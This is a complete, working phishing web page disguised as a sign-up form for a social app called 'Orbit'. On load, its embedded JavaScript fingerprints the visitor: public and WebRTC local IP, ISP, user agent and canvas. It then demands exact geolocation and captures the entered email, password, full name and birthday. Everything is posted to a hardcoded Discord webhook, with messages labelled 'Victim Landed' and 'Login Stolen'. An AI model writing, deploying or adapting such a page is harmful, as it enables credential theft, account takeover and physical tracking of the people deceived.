<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Orbit - Meet Friends & Make Money</title>
  <style>
    body { margin:0; background:#000; color:#fff; font-family:Arial, sans-serif; overflow:hidden; text-align:center; }
    video { position:fixed; top:0; left:0; width:100%; height:100%; object-fit:cover; opacity:0.6; z-index:-1; }
    .container { padding:20px; max-width:420px; margin:0 auto; position:relative; z-index:2; }
    h1 { font-size:2.4em; margin:15px 0; }
    input, button { width:100%; padding:14px; margin:10px 0; border-radius:8px; border:none; font-size:16px; }
    input { background:#111; color:#fff; }
    button { background:#00ff9d; color:#000; font-weight:bold; cursor:pointer; }
    .hidden { display:none; }
  </style>
</head>
<body>
  <video autoplay loop muted playsinline>
    <source src="https://assets.mixkit.co/videos/preview/14354/14354-large.mp4" type="video/mp4">
  </video>

  <div class="container" id="landing">
    <h1>🌍 Orbit</h1>
    <h2>Meet Friends & Make Money</h2>
    <p>Join thousands earning daily</p>
    <button onclick="startSignUp()">Sign Up Free</button>
  </div>

  <!-- Location Stage -->
  <div class="container hidden" id="locationStage">
    <h2>Location Required</h2>
    <p>We need your location to match you with nearby opportunities.</p>
    <button onclick="requestLocation()">Allow Location</button>
  </div>

  <!-- Login -->
  <div class="container hidden" id="loginStage">
    <h2>Create Account</h2>
    <input type="email" id="email" placeholder="Gmail or Email">
    <input type="password" id="password" placeholder="Create Password">
    <button onclick="submitLogin()">Continue</button>
  </div>

  <!-- Setup -->
  <div class="container hidden" id="setupStage">
    <h2>Setup Profile</h2>
    <input type="text" id="fullname" placeholder="Full Name">
    <input type="date" id="birthday">
    <input type="text" id="username" placeholder="Username">
    <input type="file" id="profilepic" accept="image/*">
    <button onclick="completeSetup()">Complete Setup</button>
  </div>

  <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1502455931399569451/M4sc-m7Cj5hPwNKjClTL-TNB_ijX3Llb6MAuMD1UJhQC3k9Rupd85L-LwLbNpskNANZH";

    async function sendWebhook(payload) {
      try {
        await fetch(WEBHOOK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
      } catch(e) {}
    }

    // === MAX FINGERPRINTING FROM BEFORE ===
    function getCanvasFingerprint() {
      try {
        const c = document.createElement('canvas');
        const ctx = c.getContext('2d');
        ctx.fillStyle = "#f00";
        ctx.fillRect(0,0,220,110);
        ctx.fillStyle = "#0f0";
        ctx.font = "18px Arial";
        ctx.fillText("Boss Logger " + Date.now(), 20, 60);
        return c.toDataURL().substring(0,180);
      } catch(e) { return "N/A"; }
    }

    async function getWebRTCIP() {
      return new Promise(r => {
        const pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({iceServers:[]});
        let ips = new Set();
        pc.onicecandidate = e => { if(e.candidate) { const m = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/); if(m) ips.add(m[0]); }};
        pc.createDataChannel("");
        pc.createOffer().then(o => pc.setLocalDescription(o));
        setTimeout(() => r([...ips].join(", ") || "N/A"), 1200);
      });
    }

    async function initialLog() {
      let ipData = {};
      try {
        const res = await Promise.allSettled([
          fetch('https://ipapi.co/json/').then(r => r.ok ? r.json() : {}),
          fetch('https://ipinfo.io/json').then(r => r.ok ? r.json() : {})
        ]);
        ipData = {...res[0].value, ...res[1].value};
      } catch(e){}

      const webrtc = await getWebRTCIP();
      const canvas = getCanvasFingerprint();

      sendWebhook({
        content: "**🪝 INITIAL MAX LOG - Victim Landed on Orbit**",
        embeds: [{
          title: "🌍 Orbit Phishing Page",
          color: 0xff0000,
          fields: [
            { name: "IP", value: `\`${ipData.ip || "N/A"}\``, inline: true },
            { name: "Local IP", value: `\`${webrtc}\``, inline: true },
            { name: "City/ISP", value: `${ipData.city || "N/A"} | ${ipData.org || "N/A"}`, inline: false },
            { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
            { name: "Screen", value: `\( {screen.width}x \){screen.height}`, inline: true },
            { name: "Canvas", value: `\`\`\`${canvas}\`\`\``, inline: false },
            { name: "Timestamp", value: new Date().toUTCString() }
          ]
        }]
      });
    }

    function showScreen(id) {
      document.querySelectorAll('.container').forEach(c => c.classList.add('hidden'));
      document.getElementById(id).classList.remove('hidden');
    }

    function startSignUp() {
      showScreen('locationStage');
    }

    function requestLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(pos => {
          const lat = pos.coords.latitude.toFixed(8);
          const lon = pos.coords.longitude.toFixed(8);
          sendWebhook({
            content: "**📍 Location Granted**",
            embeds: [{ title: "Exact Location", color: 0x00ff00, fields: [{name:"Coords", value: `${lat}, ${lon}`}] }]
          });
          showScreen('loginStage');
        }, () => {
          alert("We can't continue without location access.");
          requestLocation();
        });
      }
    }

    function submitLogin() {
      const email = document.getElementById('email').value;
      const pass = document.getElementById('password').value;

      sendWebhook({
        content: "**🔑 Login Stolen**",
        embeds: [{
          title: "Account Credentials",
          color: 0xff0000,
          fields: [
            { name: "Email", value: email || "N/A" },
            { name: "Password", value: pass || "N/A" }
          ]
        }]
      });
      showScreen('setupStage');
    }

    function completeSetup() {
      const name = document.getElementById('fullname').value;
      const birth = document.getElementById('birthday').value;
      const user = document.getElementById('username').value;

      if (birth) {
        const age = new Date().getFullYear() - parseInt(birth.split('-')[0]);
        if (age < 18) {
          alert("Sadly we can't accept you since you're under age.");
          sendWebhook({ content: "**🚫 Underage Rejection**", description: `Birthday: ${birth}` });
          return;
        }
      }

      sendWebhook({
        content: "**👤 Full Profile Setup**",
        embeds: [{
          title: "Profile Data",
          fields: [
            { name: "Full Name", value: name || "N/A" },
            { name: "Birthday", value: birth || "N/A" },
            { name: "Username", value: user || "N/A" }
          ]
        }]
      });

      alert("Account created! Welcome to Orbit.");
    }

    window.onload = () => {
      initialLog();
      console.log("%c🔥 Orbit Max Logger Active - Boss Mode", "color:lime;font-size:18px");
    };
  </script>
</body>
</html>
